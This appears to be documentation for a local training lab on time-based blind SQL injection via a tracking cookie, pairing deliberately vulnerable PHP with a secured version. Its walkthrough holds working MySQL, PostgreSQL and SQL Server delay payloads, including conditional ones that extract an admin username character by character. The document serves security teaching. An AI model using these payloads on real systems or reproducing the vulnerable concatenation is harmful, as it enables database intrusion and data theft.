# Lab 5: Blind SQL Injection with Time Delays - Complete Documentation

## 1. LAB OVERVIEW

### Purpose
This lab demonstrates a blind SQL injection vulnerability in an analytics tracking system. Unlike traditional SQL injection where results are visible, blind SQL injection occurs when the application doesn't return database results or error messages. Instead, attackers must use indirect methods like time delays to infer information about the database structure and content.

### Attack Surface
- **Vulnerable Parameter**: `TrackingId` cookie value
- **Vulnerability Type**: Blind SQL Injection with Time-Based Detection
- **Impact**: Information disclosure, potential data extraction, and database reconnaissance
- **Detection Method**: Time delays in server response

### Backend Logic
The application implements an analytics tracking system that:
1. Generates or retrieves a tracking ID from cookies
2. Uses this tracking ID in SQL queries to update user analytics
3. Performs database operations without returning results to the user
4. Executes queries synchronously, making time-based attacks possible
5. Silently handles errors, creating a "blind" injection scenario

### Database Structure
- **products**: Contains shop inventory (id, name, description, price, category, stock_quantity)
- **analytics**: Tracks user behavior (id, tracking_id, first_seen, last_seen, page_views, ip_address)
- **users**: Sensitive user data (id, username, password, email, role, secret_data)
- **Target**: The analytics table is directly vulnerable, but attackers can pivot to extract data from any table

---

## 2. WALKTHROUGH / STEP-BY-STEP SOLUTION

### Step 1: Initial Reconnaissance
1. Navigate to `http://localhost/lab5/index.php`
2. Observe that a TrackingId cookie is automatically set
3. Note the page load time displayed at the bottom of the page
4. Check browser developer tools to see the cookie value

**Expected Response**: Page loads normally with tracking cookie set (e.g., `TK1234567890abcdef`)

### Step 2: Identify the Injection Point
1. Open browser developer tools (F12)
2. Go to Application/Storage tab and locate the TrackingId cookie
3. Note the current value and page load time

**What Attacker Learns**: The application uses cookies for tracking and the TrackingId value is user-controllable

### Step 3: Test for SQL Injection
1. Modify the TrackingId cookie value to include a single quote:
   ```
   TrackingId=TK1234567890abcdef'
   ```
2. Refresh the page and observe behavior

**Expected Response**: Page may load normally or show slight delay, but no visible error (confirming "blind" nature)

### Step 4: Test Basic Time Delay (MySQL)
1. **Payload**: Modify TrackingId cookie to:
   ```
   TrackingId=x'||SLEEP(5)--
   ```

2. **How to Apply**:
   - Option A (Browser Dev Tools): Edit cookie value directly
   - Option B (Burp Suite): Intercept request and modify cookie
   - Option C (curl): Use command line with custom cookie header

3. **Expected Response**: Page takes approximately 5 seconds longer to load

4. **What Attacker Learns**: SQL injection exists and time-based payloads work

### Step 5: Achieve the Lab Goal (10 Second Delay)
1. **Final Payload**:
   ```
   TrackingId=x'||SLEEP(10)--
   ```

2. **Server Response**: 
   - Page load time increases to ~10 seconds
   - Success alert appears on the page
   - Response time counter at bottom shows the delay

3. **What Attacker Learns**: Complete control over query execution timing

### Step 6: Advanced Exploitation Examples

**A) Conditional Time Delays**:
```
TrackingId=x'||IF((SELECT COUNT(*) FROM users WHERE role='admin')>0,SLEEP(5),0)--
```
*Tests if admin users exist*

**B) Character-by-Character Data Extraction**:
```
TrackingId=x'||IF((SELECT SUBSTRING(username,1,1) FROM users WHERE role='admin' LIMIT 1)='a',SLEEP(5),0)--
```
*Extracts first character of admin username*

**C) Database Version Detection**:
```
TrackingId=x'||IF((SELECT @@version LIKE '5%'),SLEEP(5),0)--
```
*Determines MySQL version*

### Step 7: Alternative Payloads for Different Databases

**MySQL**:
```
TrackingId=x'+AND+SLEEP(10)--
TrackingId=x'+OR+BENCHMARK(10000000,MD5(1))--
TrackingId=x'||(SELECT SLEEP(10))--
```

**PostgreSQL**:
```
TrackingId=x'||pg_sleep(10)--
TrackingId=x'+AND+pg_sleep(10)--
```

**SQL Server**:
```
TrackingId=x'+WAITFOR+DELAY+'00:00:10'--
TrackingId=x'||WAITFOR+DELAY+'00:00:10'--
```

---

## 3. WHY THE EXPLOIT WORKS

### Internal Logic Flaw
The vulnerability exists due to several compounding factors:

1. **Unsanitized Input**: Cookie values are directly concatenated into SQL queries
2. **Synchronous Execution**: Database queries execute in the main thread, blocking the response
3. **Silent Error Handling**: Exceptions are caught and logged but not displayed to users
4. **No Input Validation**: No checks on cookie value format or content
5. **Blind Context**: Results aren't displayed, forcing attackers to use indirect methods

### Query Processing Flow

**Normal Query**:
```sql
UPDATE analytics SET last_seen = NOW() WHERE tracking_id = 'TK1234567890abcdef'
```

**Malicious Query**:
```sql
UPDATE analytics SET last_seen = NOW() WHERE tracking_id = 'x'||SLEEP(10)--'
```

### SQL Injection Mechanics

**Payload Breakdown**: `x'||SLEEP(10)--`
1. `x'` - Closes the original string literal
2. `||` - SQL concatenation operator (acts as OR in some contexts)
3. `SLEEP(10)` - MySQL function that pauses execution for 10 seconds
4. `--` - SQL comment that ignores the trailing quote

**Why Time Delays Work**:
1. The SLEEP() function blocks the database connection
2. PHP waits for the query to complete before sending the response
3. The user experiences the delay as increased page load time
4. This provides a binary feedback mechanism (delay/no delay)

### Root Cause Analysis

The fundamental issues are:
1. **Trust Boundary Violation**: Treating cookie data as trusted input
2. **Lack of Parameterization**: Using string concatenation instead of prepared statements
3. **Insufficient Input Validation**: No sanitization or format checking
4. **Error Disclosure**: Even though errors are hidden, timing differences reveal information

---

## 4. WRONG (VULNERABLE) CODE EXPLANATION

### The Flawed Code

**File: `config.php` (Lines 35-59)**
```php
function trackUserActivity($trackingId) {
    $conn = getConnection();
    
    // VULNERABLE CODE: Direct concatenation without sanitization
    $query = "UPDATE analytics SET last_seen = NOW() WHERE tracking_id = '" . $trackingId . "'";
    
    try {
        $conn->query($query);
        
        if ($conn->affected_rows == 0) {
            $insertQuery = "INSERT INTO analytics (tracking_id, first_seen, last_seen, page_views) VALUES ('" . $trackingId . "', NOW(), NOW(), 1)";
            $conn->query($insertQuery);
        } else {
            $updateQuery = "UPDATE analytics SET page_views = page_views + 1 WHERE tracking_id = '" . $trackingId . "'";
            $conn->query($updateQuery);
        }
    } catch (Exception $e) {
        error_log("Analytics tracking error: " . $e->getMessage());
    }
    
    $conn->close();
}
```

### Line-by-Line Security Analysis

**Lines 3-4**: Input Processing
```php
$query = "UPDATE analytics SET last_seen = NOW() WHERE tracking_id = '" . $trackingId . "'";
```
**Problems**:
- Direct string concatenation with untrusted input
- No input validation or sanitization
- No type checking or format verification
- Assumes trackingId contains only benign data

**Line 7**: Query Execution
```php
$conn->query($query);
```
**Problems**:
- Uses query() instead of prepared statements
- No parameter binding
- Executes potentially malicious SQL directly

**Lines 9-11**: Conditional Logic 
```php
if ($conn->affected_rows == 0) {
    $insertQuery = "INSERT INTO analytics (tracking_id, first_seen, last_seen, page_views) VALUES ('" . $trackingId . "', NOW(), NOW(), 1)";
    $conn->query($insertQuery);
```
**Problems**:
- Same vulnerability repeated in INSERT statement
- Multiple injection points in single function
- No validation before secondary queries

**Lines 13-15**: Update Logic
```php
$updateQuery = "UPDATE analytics SET page_views = page_views + 1 WHERE tracking_id = '" . $trackingId . "'";
$conn->query($updateQuery);
```
**Problems**:
- Third instance of the same vulnerability
- Compound risk through multiple query executions

**Lines 17-19**: Error Handling
```php
catch (Exception $e) {
    error_log("Analytics tracking error: " . $e->getMessage());
}
```
**Problems**:
- Silent failure enables blind injection
- Errors logged but not investigated
- No alerting or monitoring for suspicious patterns

### Developer Assumptions (All Wrong)

1. **"Cookies are safe because they're set by our application"**
   - Reality: Users can modify cookie values freely

2. **"Tracking IDs will always be in the expected format"**
   - Reality: Attackers can inject arbitrary strings

3. **"Hidden errors mean the application is more secure"**
   - Reality: Timing differences still reveal information

4. **"Analytics queries are low-risk because they don't return sensitive data"**
   - Reality: SQL injection can access any database table

5. **"String concatenation is simpler than prepared statements"**
   - Reality: It creates critical security vulnerabilities

### How It Leads to Exploitation

**Attack Flow**:
1. Attacker modifies TrackingId cookie value
2. Malicious input gets concatenated into SQL query
3. Database executes attacker-controlled SQL commands
4. Time delays reveal successful injection
5. Attacker iteratively extracts sensitive data

**Example Attack Progression**:
```
Original: tracking_id = 'TK1234567890abcdef'
Attacker: tracking_id = 'x'||SLEEP(10)--'
Result:   UPDATE analytics SET last_seen = NOW() WHERE tracking_id = 'x'||SLEEP(10)--''
```

---

## 5. CORRECT MITIGATION (SECURE CODE)

### Secure Implementation

**File: `config_secure.php`**
```php
<?php
// Secure version of the tracking functionality

function generateSecureTrackingId() {
    return 'TK' . bin2hex(random_bytes(16)); // 32 character hex string
}

function validateTrackingId($trackingId) {
    // Strict validation: must match expected format
    if (!preg_match('/^TK[a-f0-9]{32}$/', $trackingId)) {
        return false;
    }
    
    // Additional length check
    if (strlen($trackingId) !== 34) {
        return false;
    }
    
    return true;
}

function trackUserActivitySecure($trackingId) {
    // Input validation first
    if (!validateTrackingId($trackingId)) {
        error_log("Invalid tracking ID attempted: " . substr($trackingId, 0, 50));
        return false;
    }
    
    $conn = getConnection();
    
    try {
        // SECURE: Use prepared statements with parameter binding
        $stmt = $conn->prepare("UPDATE analytics SET last_seen = NOW() WHERE tracking_id = ?");
        $stmt->bind_param("s", $trackingId);
        $stmt->execute();
        
        if ($stmt->affected_rows == 0) {
            // Insert new tracking record with prepared statement
            $insertStmt = $conn->prepare("INSERT INTO analytics (tracking_id, first_seen, last_seen, page_views, ip_address) VALUES (?, NOW(), NOW(), 1, ?)");
            $ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
            $insertStmt->bind_param("ss", $trackingId, $ipAddress);
            $insertStmt->execute();
            $insertStmt->close();
        } else {
            // Update page views with prepared statement
            $updateStmt = $conn->prepare("UPDATE analytics SET page_views = page_views + 1 WHERE tracking_id = ?");
            $updateStmt->bind_param("s", $trackingId);
            $updateStmt->execute();
            $updateStmt->close();
        }
        
        $stmt->close();
        
        // Log successful tracking for monitoring
        error_log("Analytics tracking successful for ID: " . substr($trackingId, 0, 8) . "...");
        return true;
        
    } catch (Exception $e) {
        // Secure error handling with rate limiting
        error_log("Analytics error: " . $e->getMessage() . " | IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown'));
        
        // Implement rate limiting for failed attempts
        $rateLimiter = new RateLimiter($_SERVER['REMOTE_ADDR'] ?? 'unknown');
        $rateLimiter->recordFailedAttempt();
        
        return false;
    } finally {
        $conn->close();
    }
}

class RateLimiter {
    private $ip;
    private $maxAttempts = 10;
    private $timeWindow = 300; // 5 minutes
    
    public function __construct($ip) {
        $this->ip = $ip;
    }
    
    public function recordFailedAttempt() {
        $filename = sys_get_temp_dir() . '/tracking_failures_' . md5($this->ip);
        $currentTime = time();
        
        // Read existing attempts
        $attempts = [];
        if (file_exists($filename)) {
            $attempts = unserialize(file_get_contents($filename));
        }
        
        // Clean old attempts
        $attempts = array_filter($attempts, function($time) use ($currentTime) {
            return ($currentTime - $time) < $this->timeWindow;
        });
        
        // Add current attempt
        $attempts[] = $currentTime;
        
        // Save attempts
        file_put_contents($filename, serialize($attempts));
        
        // Check if rate limit exceeded
        if (count($attempts) > $this->maxAttempts) {
            error_log("Rate limit exceeded for IP: " . $this->ip);
            http_response_code(429);
            die("Rate limit exceeded. Try again later.");
        }
    }
}

// Secure cookie management
function setSecureTrackingCookie($trackingId) {
    $options = [
        'expires' => time() + (86400 * 30), // 30 days
        'path' => '/',
        'domain' => '', 
        'secure' => isset($_SERVER['HTTPS']), // Only over HTTPS if available
        'httponly' => true, // Prevent JavaScript access
        'samesite' => 'Strict' // CSRF protection
    ];
    
    setcookie('TrackingId', $trackingId, $options);
}

function getSecureTrackingId() {
    if (isset($_COOKIE['TrackingId'])) {
        $trackingId = $_COOKIE['TrackingId'];
        
        // Validate existing cookie
        if (validateTrackingId($trackingId)) {
            return $trackingId;
        } else {
            // Invalid cookie, generate new one
            error_log("Invalid tracking cookie detected: " . substr($trackingId, 0, 20));
        }
    }
    
    // Generate new tracking ID
    $newTrackingId = generateSecureTrackingId();
    setSecureTrackingCookie($newTrackingId);
    return $newTrackingId;
}
?>
```

### Security Measures Explained

**1. Input Validation**
```php
function validateTrackingId($trackingId) {
    if (!preg_match('/^TK[a-f0-9]{32}$/', $trackingId)) {
        return false;
    }
    return true;
}
```
- **Whitelist Validation**: Only allows specific format (TK + 32 hex characters)
- **Regular Expression**: Strict pattern matching prevents injection
- **Length Check**: Additional validation layer

**2. Prepared Statements**
```php
$stmt = $conn->prepare("UPDATE analytics SET last_seen = NOW() WHERE tracking_id = ?");
$stmt->bind_param("s", $trackingId);
$stmt->execute();
```
- **SQL and Data Separation**: Query structure separated from data
- **Parameter Binding**: Database treats input as data, not executable code
- **Type Safety**: Explicit parameter types ("s" for string)

**3. Secure Cookie Management**
```php
$options = [
    'httponly' => true, // Prevent JavaScript access
    'samesite' => 'Strict', // CSRF protection
    'secure' => isset($_SERVER['HTTPS']) // HTTPS only when available
];
```
- **HttpOnly**: Prevents XSS cookie theft
- **SameSite**: Protects against CSRF attacks
- **Secure Flag**: Ensures HTTPS transmission when available

**4. Rate Limiting**
```php
class RateLimiter {
    private $maxAttempts = 10;
    private $timeWindow = 300; // 5 minutes
```
- **Attempt Tracking**: Monitors failed attempts per IP
- **Time Windows**: Sliding window approach
- **Automatic Blocking**: Prevents brute force attacks

**5. Comprehensive Logging**
```php
error_log("Analytics error: " . $e->getMessage() . " | IP: " . $_SERVER['REMOTE_ADDR']);
```
- **Detailed Error Logging**: Captures attack attempts
- **IP Address Tracking**: Enables forensic analysis
- **Pattern Detection**: Helps identify attack campaigns

---

## 6. COMPARISON (WRONG CODE vs FIXED CODE)

### Key Differences Summary

| Aspect | Vulnerable Code | Secure Code | Impact |
|--------|----------------|-------------|--------|
| **Input Processing** | Direct concatenation | Validation + Prepared statements | Eliminates injection |
| **Query Construction** | String building | Parameter binding | Prevents malicious SQL |
| **Cookie Security** | Basic setcookie() | Secure attributes | Prevents cookie attacks |
| **Error Handling** | Silent failures | Rate limiting + logging | Detects attack attempts |
| **Validation** | None | Strict format checking | Rejects malicious input |
| **Monitoring** | Basic error logs | Comprehensive tracking | Enables incident response |

### Detailed Comparison

**1. Input Processing**

**Vulnerable**:
```php
$query = "UPDATE analytics SET last_seen = NOW() WHERE tracking_id = '" . $trackingId . "'";
```

**Secure**:
```php
if (!validateTrackingId($trackingId)) {
    return false;
}
$stmt = $conn->prepare("UPDATE analytics SET last_seen = NOW() WHERE tracking_id = ?");
$stmt->bind_param("s", $trackingId);
```

**What Changed**: Added validation and switched to prepared statements
**Why It Matters**: Completely eliminates SQL injection vulnerability

**2. Cookie Management**

**Vulnerable**:
```php
setcookie('TrackingId', $trackingId, time() + (86400 * 30), '/');
```

**Secure**:
```php
$options = [
    'expires' => time() + (86400 * 30),
    'path' => '/',
    'secure' => isset($_SERVER['HTTPS']),
    'httponly' => true,
    'samesite' => 'Strict'
];
setcookie('TrackingId', $trackingId, $options);
```

**What Changed**: Added security flags and options
**Why It Matters**: Prevents cookie theft and manipulation

**3. Error Handling**

**Vulnerable**:
```php
catch (Exception $e) {
    error_log("Analytics tracking error: " . $e->getMessage());
}
```

**Secure**:
```php
catch (Exception $e) {
    error_log("Analytics error: " . $e->getMessage() . " | IP: " . $_SERVER['REMOTE_ADDR']);
    $rateLimiter = new RateLimiter($_SERVER['REMOTE_ADDR']);
    $rateLimiter->recordFailedAttempt();
    return false;
}
```

**What Changed**: Added rate limiting and detailed logging
**Why It Matters**: Detects and prevents attack attempts

### Attack Vector Elimination

**How Vulnerable Code Fails**:
- Input: `x'||SLEEP(10)--`
- Result: `UPDATE analytics SET last_seen = NOW() WHERE tracking_id = 'x'||SLEEP(10)--'`
- Effect: 10-second delay, successful blind SQL injection

**How Secure Code Prevents**:
- Input validation rejects `x'||SLEEP(10)--` (doesn't match `/^TK[a-f0-9]{32}$/`)
- Even if bypassed, prepared statements treat entire input as string literal
- Rate limiting blocks repeated attack attempts
- Comprehensive logging alerts administrators

### Performance Impact

**Vulnerable Code**:
- Fast execution under normal conditions
- Vulnerable to denial of service through time delays
- No protection against resource exhaustion

**Secure Code**:
- Minimal overhead from validation (microseconds)
- Prepared statements may cache query plans (performance benefit)
- Rate limiting prevents resource abuse
- Monitoring adds negligible overhead

### Security Monitoring Capabilities

**Vulnerable Version**:
- Basic error logging only
- No attack detection
- Difficult to trace attack sources
- No automated response

**Secure Version**:
- Detailed audit trail
- Attack pattern detection
- IP-based tracking
- Automated rate limiting
- Forensic analysis capabilities

**Conclusion**: The secure implementation provides comprehensive protection against blind SQL injection while maintaining functionality and performance. The key improvements are input validation, prepared statements, secure cookie management, and comprehensive monitoring.

---

## Setup Instructions

1. **Prerequisites**: XAMPP with Apache, PHP, and MySQL running
2. **Installation**: Copy all files to `C:\xampp\htdocs\lab5\`
3. **Database Setup**: Run `http://localhost/lab5/setup.php`
4. **Access Lab**: Navigate to `http://localhost/lab5/index.php`
5. **Test Vulnerability**: Modify TrackingId cookie to include time delay payloads
6. **Complete Challenge**: Cause a 10-second delay to solve the lab

## Learning Objectives

After completing this lab, you should understand:
- How blind SQL injection differs from traditional injection
- The power of time-based inference techniques
- Why input validation and prepared statements are critical
- How to detect and prevent timing-based attacks
- The importance of comprehensive security monitoring